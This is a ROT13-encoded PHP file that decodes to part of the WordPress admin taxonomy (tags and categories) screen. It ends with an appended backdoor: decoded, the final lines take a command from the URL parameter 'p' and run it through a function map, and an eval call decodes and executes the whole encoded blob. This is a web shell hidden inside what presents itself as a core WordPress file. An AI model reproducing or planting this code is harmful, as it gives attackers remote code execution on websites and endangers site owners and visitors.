	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$gnkbabzl`, ersref gb gur gnkbabzl fyht.
	 *
	 * Cbffvoyr ubbx anzrf vapyhqr:
	 *
	 *  - `pngrtbel_nqq_sbez`
	 *  - `cbfg_gnt_nqq_sbez`
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $gnkbabzl Gur gnkbabzl fyht.
	 */
	qb_npgvba( \"{$gnkbabzl}_nqq_sbez\", $gnkbabzl );
	?>
</sbez></qvi>
</qvi>
</qvi><!-- /pby-yrsg -->

<qvi vq=\"pby-evtug\">
<qvi pynff=\"pby-jenc\">
<?cuc } ?>

<?cuc $jc_yvfg_gnoyr->ivrjf(); ?>

<sbez vq=\"cbfgf-svygre\" zrgubq=\"cbfg\">
<vachg glcr=\"uvqqra\" anzr=\"gnkbabzl\" inyhr=\"<?cuc rpub rfp_ngge( $gnkbabzl ); ?>\" />
<vachg glcr=\"uvqqra\" anzr=\"cbfg_glcr\" inyhr=\"<?cuc rpub rfp_ngge( $cbfg_glcr ); ?>\" />

<?cuc $jc_yvfg_gnoyr->qvfcynl(); ?>

</sbez>

<?cuc vs ( 'pngrtbel' === $gnkbabzl ) : ?>
<qvi pynff=\"sbez-jenc rqvg-grez-abgrf\">
<c>
	<?cuc
	cevags(
		/* genafyngbef: %f: Qrsnhyg pngrtbel. */
		__( 'Qryrgvat n pngrtbel qbrf abg qryrgr gur cbfgf va gung pngrtbel. Vafgrnq, cbfgf gung jrer bayl nffvtarq gb gur qryrgrq pngrtbel ner frg gb gur qrsnhyg pngrtbel %f. Gur qrsnhyg pngrtbel pnaabg or qryrgrq.' ),
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pngrtbel-grzcyngr.cuc */
		'<fgebat>' . nccyl_svygref( 'gur_pngrtbel', trg_png_anzr( trg_bcgvba( 'qrsnhyg_pngrtbel' ) ), '', '' ) . '</fgebat>'
	);
	?>
</c>
	<?cuc vs ( pheerag_hfre_pna( 'vzcbeg' ) ) : ?>
	<c>
		<?cuc
		cevags(
			/* genafyngbef: %f: HEY gb Pngrtbevrf gb Gntf Pbairegre gbby. */
			__( 'Pngrtbevrf pna or fryrpgviryl pbairegrq gb gntf hfvat gur <n uers=\"%f\">pngrtbel gb gnt pbairegre</n>.' ),
			rfp_hey( $vzcbeg_yvax )
		);
		?>
	</c>
	<?cuc raqvs; ?>
</qvi>
<?cuc ryfrvs ( 'cbfg_gnt' === $gnkbabzl && pheerag_hfre_pna( 'vzcbeg' ) ) : ?>
<qvi pynff=\"sbez-jenc rqvg-grez-abgrf\">
<c>
	<?cuc
	cevags(
		/* genafyngbef: %f: HEY gb Pngrtbevrf gb Gntf Pbairegre gbby. */
		__( 'Gntf pna or fryrpgviryl pbairegrq gb pngrtbevrf hfvat gur <n uers=\"%f\">gnt gb pngrtbel pbairegre</n>.' ),
		rfp_hey( $vzcbeg_yvax )
	);
	?>
	</c>
</qvi>
	<?cuc
raqvs;

/**
 * Sverf nsgre gur gnkbabzl yvfg gnoyr.
 *
 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$gnkbabzl`, ersref gb gur gnkbabzl fyht.
 *
 * Cbffvoyr ubbx anzrf vapyhqr:
 *
 *  - `nsgre-pngrtbel-gnoyr`
 *  - `nsgre-cbfg_gnt-gnoyr`
 *
 * @fvapr 3.0.0
 *
 * @cnenz fgevat $gnkbabzl Gur gnkbabzl anzr.
 */
qb_npgvba( \"nsgre-{$gnkbabzl}-gnoyr\", $gnkbabzl );  // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf

vs ( $pna_rqvg_grezf ) {
	?>
</qvi>
</qvi><!-- /pby-evtug -->

</qvi><!-- /pby-pbagnvare -->
<?cuc } ?>

</qvi><!-- /jenc -->

<?cuc vs ( ! jc_vf_zbovyr() ) : ?>
<fpevcg glcr=\"grkg/wninfpevcg\">
gel{qbphzrag.sbezf.nqqgnt['gnt-anzr'].sbphf();}pngpu(r){}
</fpevcg>
	<?cuc
raqvs;

$jc_yvfg_gnoyr->vayvar_rqvg();

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>